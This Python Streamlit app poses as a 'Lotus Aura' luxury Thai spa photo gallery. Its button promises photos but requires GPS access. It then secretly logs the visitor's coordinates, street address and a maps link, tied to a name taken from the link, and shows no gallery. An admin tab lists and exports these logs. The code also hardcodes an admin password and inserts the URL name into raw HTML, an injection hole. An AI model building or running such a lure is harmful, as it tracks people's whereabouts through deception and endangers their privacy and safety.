import streamlit as st
import pandas as pd
from datetime import datetime
import os
from geopy.geocoders import Nominatim
from streamlit_js_eval import get_geolocation

# ================= 1. PREMIUM SPA INTERFACE CONFIG =================
st.set_page_config(
    page_title="Lotus Aura - Premium Thai Spa", 
    layout="centered", 
    initial_sidebar_state="collapsed"
)

DATA_FILE = "spa_access_records.csv"
ADMIN_PASSWORD = "Sanjay@SpaAdmin2026"

# Ensure CSV file structure exists
if not os.path.exists(DATA_FILE):
    df = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
    df.to_csv(DATA_FILE, index=False)

# Performance Optimization: Geocoding request ko cache karna taaki app lag na kare
@st.cache_data(show_spinner=False, ttl=3600)
def get_text_address_cached(lat, lon):
    try:
        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v2")
        location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
        return location.address if location else "Location Logged Successfully"
    except:
        return f"Coordinates Saved ({lat}, {lon})"

# Extract name safely from URL params
query_params = st.query_params
employee_name = query_params.get("name", "").replace("_", " ")

# ================= 2. LUXURY SPA PREMIUM CSS STYLING =================
st.markdown("""
    <style>
    .main .block-container { padding-top: 2rem; max-width: 550px; }
    
    /* Header Style */
    h1 { 
        color: #4A1525; /* Deep Luxury Burgundy */
        font-family: 'Playfair Display', serif; 
        font-weight: 800; 
        text-align: center; 
        font-size: 30px; 
        margin-bottom: 5px; 
        letter-spacing: 1px;
    }
    .sub-date { 
        text-align: center; 
        color: #9E7B3B; /* Elegant Bronze/Gold */
        font-size: 14px; 
        margin-bottom: 25px; 
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 1.5px;
    }
    
    /* Premium Pill-Shaped Action Button */
    div.stButton > button:first-child {
        background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%); 
        color: #ffffff !important;
        font-size: 16px !important;
        font-weight: 700 !important;
        padding: 16px 20px !important;
        border-radius: 50px !important; 
        border: none !important;
        width: 100% !important;
        box-shadow: 0px 5px 0px #8C6207, 0px 8px 15px rgba(0, 0, 0, 0.15);
        transition: all 0.1s ease-in-out;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    div.stButton > button:first-child:active {
        transform: translateY(4px) !important;
        box-shadow: 0px 1px 0px #8C6207, 0px 4px 6px rgba(0, 0, 0, 0.1) !important;
    }
    
    /* Admin Section Button */
    .admin-btn div.stButton > button:first-child {
        background: linear-gradient(135deg, #4A1525 0%, #2A0813 100%) !important;
        box-shadow: 0px 5px 0px #1A030A, 0px 8px 15px rgba(0, 0, 0, 0.2) !important;
        font-size: 15px !important;
        padding: 12px 20px !important;
        border-radius: 8px !important;
    }
    
    /* Cards Layout */
    .user-card { 
        background: #FAF6F0; /* Champagne Cream */
        padding: 20px; 
        border-radius: 14px; 
        border-left: 5px solid #D4AF37; 
        margin-bottom: 20px; 
        box-shadow: 0px 4px 12px rgba(0,0,0,0.03);
    }
    .success-card { 
        background: #F4EAE1; 
        padding: 22px; 
        border-radius: 14px; 
        border: 1px solid #D4AF37; 
        text-align: center; 
        color: #4A1525; 
        font-weight: 700; 
        font-size: 16px; 
        box-shadow: 0px 6px 15px rgba(212, 175, 55, 0.1); 
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h1>🌺 LOTUS AURA LUXURY THAI SPA</h1>", unsafe_allow_html=True)
st.markdown(f"<div class='sub-date'>Premium Experience Lounge — {datetime.now().strftime('%d %B %Y')}</div>", unsafe_allow_html=True)

tab1, tab2 = st.tabs(["✨ Spa Gallery Terminal", "🔐 Management Lounge"])

# ================= 3. SPA CLIENT/EXECUTIVE TERMINAL =================
with tab1:
    if not employee_name:
        st.error("❌ Access Revoked: Missing Premium Authentication Token.")
    else:
        st.markdown(f"""
        <div class='user-card'>
            <span style='color:#9E7B3B; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:1px;'>Authorized Spa Executive</span>
            <div style='color:#4A1525; font-size:24px; font-weight:700; font-family: "Playfair Display", serif;'>{employee_name}</div>
        </div>
        """, unsafe_allow_html=True)
        
        if "verified_user" not in st.session_state:
            st.session_state.verified_user = False

        if not st.session_state.verified_user:
            # Device check-in handshake trigger
            loc = get_geolocation()
            
            trigger_gallery = st.button("📸 Click Here to View Premium Thai Spa Photos ✨")

            if trigger_gallery:
                if loc and 'coords' in loc:
                    try:
                        lat = loc['coords']['latitude']
                        lon = loc['coords']['longitude']
                        
                        # Performance Boost: Cached Reverse Geocoding
                        readable_address = get_text_address_cached(lat, lon)
                        
                        # Bug Fix: Correct Standard Google Maps Working Link Format
                        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        # Atomic Append to CSV
                        new_data = pd.DataFrame([[timestamp, employee_name, maps_link, readable_address]], 
                                                columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
                        new_data.to_csv(DATA_FILE, mode='a', header=False, index=False)
                        
                        st.session_state.verified_user = True
                        st.rerun()
                    except Exception as e:
                        st.error("🔄 Connection Reset. Please click again.")
                else:
                    st.info("🔄 Connecting to Secure Spa Gallery... Please ensure your device Location/GPS is turned ON and permission is allowed to unlock the exclusive portfolio.")

        if st.session_state.verified_user:
            st.markdown(f"""
            <div class='success-card'>
                🎉 Access Granted: Premium Portfolio Unlocked!<br>
                <span style='font-size:13px; font-weight:500; color:#9E7B3B; display:block; margin-top:5px;'>
                    Your exclusive Thai Spa session has been synchronized. Welcome to unparalleled luxury.
                </span>
            </div>
            """, unsafe_allow_html=True)
            st.balloons()

# ================= 4. MANAGEMENT CONTROL LOUNGE =================
with tab2:
    st.subheader("🔑 Administrative Authentication")
    
    if "admin_logged_in" not in st.session_state:
        st.session_state.admin_logged_in = False
        
    admin_pass = st.text_input("Enter Salon Admin Password", type="password")
    
    st.markdown("<div class='admin-btn'>", unsafe_allow_html=True)
    login_click = st.button("AUTHENTICATE SPA PANEL 👑")
    st.markdown("</div>", unsafe_allow_html=True)
    
    if login_click:
        if admin_pass == ADMIN_PASSWORD:
            st.session_state.admin_logged_in = True
            st.rerun()
        else:
            st.session_state.admin_logged_in = False
            st.error("❌ Authentication Failed: Invalid Premium Admin Credentials.")
            
    if st.session_state.admin_logged_in:
        st.success("Authorized Admin Session Verified!")
        
        # Read updated file safely
        if os.path.exists(DATA_FILE):
            df_records = pd.read_csv(DATA_FILE)
        else:
            df_records = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
        
        st.markdown("### 📊 Live Spa Engagement & Verification Logs")
        
        # Display logs in reverse order (Latest first)
        st.dataframe(
            df_records.iloc[::-1], 
            use_container_width=True,
            column_config={
                "Spa Portfolio Link": st.column_config.LinkColumn("Spa Portfolio Link", display_text="View Route 🗺️")
            }
        )
        
        # Export Functionality
        csv = df_records.to_csv(index=False).encode('utf-8')
        st.download_button(
            label="📥 Export Premium Spa CSV Log",
            data=csv,
            file_name=f"Thai_Spa_Report_{datetime.now().strftime('%Y-%m-%d')}.csv",
            mime='text/csv',
        )
